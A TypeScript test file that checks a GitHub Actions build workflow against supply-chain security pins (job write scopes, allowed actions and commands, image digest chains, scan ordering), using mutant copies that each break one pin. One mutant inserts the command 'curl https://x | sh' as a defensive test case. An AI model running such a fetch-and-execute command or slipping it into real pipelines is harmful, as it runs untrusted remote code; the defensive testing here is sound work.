// POLY-100 R11 / seceng B2 pins on .github/workflows/build.yml. `violations(wf)` returns every pin the workflow breaks; the real file must return none and
// each mutant (one edit to a copy) must return something. GitHub grants permissions to a whole job, so the pins limit what the two writing jobs may RUN.
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { parse } from 'yaml';

const ROOT = join(dirname(new URL(import.meta.url).pathname), '..', '..');
const real: any = parse(readFileSync(join(ROOT, '.github', 'workflows', 'build.yml'), 'utf8'));
const clone = () => structuredClone(real);

const WRITERS = ['build', 'siblings'];
const WRITE_PERMS = { contents: 'read', packages: 'write', 'id-token': 'write', attestations: 'write' };
const USES_COMMON = ['actions/checkout', 'docker/setup-buildx-action', 'docker/login-action', 'docker/build-push-action', 'actions/attest-build-provenance'];
const USES_BUILD = [...USES_COMMON, 'actions/attest-sbom', 'actions/upload-artifact'];
const RUN_OK = [
  /^bash infra\/ci\/install-trivy\.sh$/,
  /^bash infra\/ci\/image\.sh (scan|check|sbom) "\$\{(IMAGE|REGISTRY)\}[^"]*"$/,
  /^bash infra\/ci\/images-env\.sh "\$POSTGRES" "\$TOOLS" "\$CADDY"$/,
  /^set -euo pipefail\n[\s\S]*digest\.txt/,
];
const SIB = ['postgres', 'tools', 'caddy'];
const out = (n: string) => `\${{ steps.${n}.outputs.digest }}`;

export function violations(wf: any): string[] {
  const v: string[] = [];
  const jobs = wf.jobs;
  // 1. write scopes
  const writing = Object.keys(jobs).filter((j) => Object.values(jobs[j].permissions ?? {}).some((x) => x === 'write')).sort();
  if (JSON.stringify(writing) !== JSON.stringify(WRITERS)) v.push(`write scopes in ${writing.join(',')}, not exactly ${WRITERS.join(',')}`);
  for (const j of WRITERS) if (JSON.stringify(jobs[j]?.permissions) !== JSON.stringify(WRITE_PERMS)) v.push(`${j} permissions are not exactly contents:read + the three writes`);
  if (Object.values(wf.permissions ?? {}).some((x) => x === 'write')) v.push('a workflow-level write');
  // 2. fixed uses / run sets, nothing that installs or runs node code
  for (const j of WRITERS) {
    for (const s of jobs[j]?.steps ?? []) {
      const blob = `${s.uses ?? ''} ${s.run ?? ''}`;
      if (/\b(pnpm|npm|npx|corepack|node|setup-node)\b/.test(blob)) v.push(`${j}: a package manager or node: ${blob.slice(0, 40)}`);
      if (s.uses && !(j === 'build' ? USES_BUILD : USES_COMMON).includes(String(s.uses).split('@')[0])) v.push(`${j}: uses outside the fixed set: ${s.uses}`);
      if (s.run && !RUN_OK.some((re) => re.test(String(s.run).trim()))) v.push(`${j}: run outside the fixed set: ${String(s.run).slice(0, 40)}`);
    }
  }
  // 3. siblings: build < scan < attest, one digest chain per image
  const st: any[] = jobs.siblings?.steps ?? [];
  const ids = st.filter((s) => s.uses?.startsWith('docker/build-push-action')).map((s) => s.id);
  if (JSON.stringify(ids) !== JSON.stringify(SIB)) v.push(`siblings build exactly ${SIB.join(',')}, found ${ids.join(',')}`);
  for (const n of SIB) {
    const b = st.findIndex((s) => s.id === n);
    const sc = st.findIndex((s, i) => i > b && /image\.sh scan/.test(s.run ?? '') && String(s.run).includes(`polycarpic-${n}@`));
    const at = st.findIndex((s) => s.uses?.startsWith('actions/attest-build-provenance') && String(s.with?.['subject-name']).endsWith(`/polycarpic-${n}`));
    if (b < 0 || sc < 0 || at < 0 || !(b < sc && sc < at)) v.push(`siblings ${n}: not build < scan < attest`);
    if (at >= 0 && st[at].with['subject-digest'] !== out(n)) v.push(`siblings ${n}: the attestation is of another step's digest`);
    if (at >= 0 && String(st[at].with['push-to-registry']) !== 'true') v.push(`siblings ${n}: not pushed to the registry`);
    if (sc >= 0 && ![st[sc].env?.DIGEST, st[sc].run].some((x) => String(x).includes(out(n)))) v.push(`siblings ${n}: the scan does not read this build's digest`);
    if (jobs.siblings?.outputs?.[n] !== out(n)) v.push(`siblings ${n}: the job output is not this build's digest`);
    if (b >= 0 && !String(st[b].with?.tags ?? '').includes(`polycarpic-${n}:sha-`)) v.push(`siblings ${n}: no per-run tag`);
  }
  // 4. build needs both and writes images.env from the siblings' outputs, in order, before the app build
  const needs = [].concat(jobs.build?.needs ?? []).sort();
  if (JSON.stringify(needs) !== JSON.stringify(['release-lint', 'siblings'])) v.push('build does not need exactly siblings and release-lint');
  const bs: any[] = jobs.build?.steps ?? [];
  const ie = bs.findIndex((s) => /images-env\.sh/.test(s.run ?? ''));
  const app = bs.findIndex((s) => s.id === 'build');
  if (ie < 0 || app < 0 || ie > app) v.push('build: images-env.sh is not before the app build');
  if (ie >= 0) {
    const e = bs[ie].env ?? {};
    for (const [k, n] of [['POSTGRES', 'postgres'], ['TOOLS', 'tools'], ['CADDY', 'caddy']]) if (e[k] !== `\${{ needs.siblings.outputs.${n} }}`) v.push(`build: images-env ${k} is not needs.siblings.outputs.${n}`);
  }
  // 5. release-lint is read-only and downstream of siblings; the scan-only finder is `release-scan`
  const rl = jobs['release-lint'];
  if (!rl || JSON.stringify(rl.needs) !== '"siblings"' || JSON.stringify(rl.permissions) !== '{"contents":"read"}') v.push('release-lint: missing, not after siblings, or not read-only');
  if (!jobs['release-scan']) v.push('no job with the id release-scan');
  // 6. release-scan: the app plus the three siblings, no early stop, nothing unchecked reaches the scan
  const run = String(jobs['release-scan']?.steps?.map((s: any) => s.run ?? '').join('\n') ?? '');
  if (!/image\.sh scan "\$\{IMAGE\}@\$\{DIGEST\}" \|\| status=1/.test(run)) v.push('release-scan: the app scan is missing or stops the run');
  if (!/=~ \^POLY_\(POSTGRES\|TOOLS\|CADDY\)_IMAGE=ghcr\\\.io\/richmosko\/polycarpic-\(postgres\|tools\|caddy\)@\(sha256:\[0-9a-f\]\{64\}\)\$ \]\]/.test(run)) v.push('release-scan: no fixed-grammar check on images.env lines');
  if (!/if \[\[ "\$line" =~[\s\S]*?then[\s\S]*?image\.sh scan "ghcr\.io\/richmosko\/polycarpic-\$\{BASH_REMATCH\[2\]\}@\$\{BASH_REMATCH\[3\]\}" \|\| status=1[\s\S]*?else[\s\S]*?status=1/.test(run)) v.push('release-scan: a sibling is scanned outside the checked branch, or an unchecked line does not fail');
  if (/\|\| exit\b|\|\| return\b/.test(run) || /^\s*set -e(?!u)/m.test(run)) v.push('release-scan: stops at the first failure');
  if (!/exit "\$status"/.test(run) || !/wc -w\)" = 3/.test(run)) v.push('release-scan: the exit status or the three-siblings count is missing');
  return v;
}

describe('build.yml pins (POLY-100 B2, R11)', () => {
  it('the real workflow breaks none', () => expect(violations(real)).toEqual([]));

  const mutants: [string, (w: any) => void][] = [
    ['a third job with packages: write', (w) => { w.jobs.extra = { 'runs-on': 'ubuntu-latest', permissions: { contents: 'read', packages: 'write' }, steps: [] }; }],
    ['pnpm install in build', (w) => { w.jobs.build.steps.splice(1, 0, { run: 'pnpm install' }); }],
    ['setup-node in siblings', (w) => { w.jobs.siblings.steps.splice(1, 0, { uses: 'actions/setup-node@abc' }); }],
    ['an unlisted action in build', (w) => { w.jobs.build.steps.splice(1, 0, { uses: 'someone/else@abc' }); }],
    ['an unlisted run in siblings', (w) => { w.jobs.siblings.steps.splice(1, 0, { run: 'curl https://x | sh' }); }],
    ['a workflow-level write', (w) => { w.permissions = { packages: 'write' }; }],
    ['build gains a fifth permission', (w) => { w.jobs.build.permissions['pull-requests'] = 'write'; }],
    ['scan after attest for one sibling', (w) => { const s = w.jobs.siblings.steps; const i = s.findIndex((x: any) => /polycarpic-tools@/.test(x.run ?? '')); [s[i], s[i + 1]] = [s[i + 1], s[i]]; }],
    ['a sibling attesting another step\'s digest', (w) => { const a = w.jobs.siblings.steps.find((x: any) => String(x.with?.['subject-name']).endsWith('polycarpic-caddy')); a.with['subject-digest'] = out('tools'); }],
    ['a sibling scan on another digest', (w) => { const s = w.jobs.siblings.steps.find((x: any) => /polycarpic-caddy@/.test(x.run ?? '')); s.env = { DIGEST: out('tools') }; s.run = String(s.run).replace(out('caddy'), out('tools')); }],
    ['swapped postgres and tools arguments', (w) => { const s = w.jobs.build.steps.find((x: any) => /images-env/.test(x.run ?? '')); [s.env.POSTGRES, s.env.TOOLS] = [s.env.TOOLS, s.env.POSTGRES]; }],
    ['release-lint dropped from build.needs', (w) => { w.jobs.build.needs = ['siblings']; }],
    ['release-lint with write scopes', (w) => { w.jobs['release-lint'].permissions = { contents: 'read', packages: 'write' }; }],
    ['release-scan renamed (the finder cannot select it)', (w) => { w.jobs.scan = w.jobs['release-scan']; delete w.jobs['release-scan']; }],
    ['release-scan scans the app only', (w) => { const s = w.jobs['release-scan'].steps.find((x: any) => /BASH_REMATCH/.test(x.run ?? '')); s.run = String(s.run).replace(/while IFS=[\s\S]*?done < images\.env\n/, ''); }],
    ['release-scan stops at the first failure', (w) => { const s = w.jobs['release-scan'].steps.find((x: any) => /BASH_REMATCH/.test(x.run ?? '')); s.run = String(s.run).replace('"${IMAGE}@${DIGEST}" || status=1', '"${IMAGE}@${DIGEST}" || exit 1'); }],
    ['release-scan passes an unchecked line to the scan', (w) => { const s = w.jobs['release-scan'].steps.find((x: any) => /BASH_REMATCH/.test(x.run ?? '')); s.run = String(s.run).replace(/if \[\[ "\$line" =~[\s\S]*?; then/, 'if true; then'); }],
  ];
  for (const [name, edit] of mutants) {
    it(`red on: ${name}`, () => {
      const w = clone();
      edit(w);
      expect(violations(w)).not.toEqual([]);
    });
  }
});
